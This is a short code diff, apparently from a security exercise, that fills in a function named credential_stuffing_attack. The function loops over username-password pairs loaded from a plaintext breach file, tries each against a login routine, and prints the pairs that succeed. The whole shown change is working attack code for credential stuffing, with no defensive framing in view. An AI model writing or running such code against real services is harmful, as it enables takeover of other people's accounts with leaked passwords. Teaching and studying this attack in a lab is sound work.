@@ -22,7 +22,13 @@ def attempt_login(username, password):
     return response.status_code == codes.ok
 
 def credential_stuffing_attack(creds):
-    pass
+    results = []
+    for cred in creds:
+        if(attempt_login(cred[0],cred[1])):
+            results.append(cred)
+    print(results)
+
+
 
 def main():
     creds = load_breach(PLAINTEXT_BREACH_PATH)
